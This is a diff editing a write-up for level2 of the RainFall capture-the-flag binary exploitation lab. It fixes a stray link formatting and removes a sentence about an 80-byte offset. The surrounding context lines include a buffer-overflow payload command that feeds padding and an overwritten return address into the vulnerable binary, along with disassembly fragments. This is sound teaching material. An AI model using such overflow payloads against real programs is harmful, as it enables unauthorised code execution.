@@ -163,7 +163,7 @@ It printed some of the ‘A’ we provided and some other memory, but it’s not
 
 Here i provided a random address ( this line in main : `0x08048540 <+1>:     mov    ebp,esp` ) but if the address is relevant, this line could indeed create a segfault.
 
-Let’s try pointing to this line instead :  `0x08048516 <+66>:    call   0x80483a0 [printf@plt](mailto:printf@plt)           // Call printf` and hope it executes printf and then exits with 1
+Let’s try pointing to this line instead :  `0x08048516 <+66>:    call   0x80483a0 [printf@plt]          // Call printf` and hope it executes printf and then exits with 1
 
 ```nasm
 level2@RainFall:~$ python -c 'print "A" * 80 + "\x16\x85\x04\x08"' | ./level2
@@ -236,8 +236,6 @@ Dump of assembler code for function p:
    0x0804853e <+106>:	ret    
 End of assembler dump.
 ```
-
-In the previous exercice we had a 80 bytes offset, so we will try 80 again.
 
 We should take in consideration the order of the stack (we don’t do exactly like the schema above) :
 
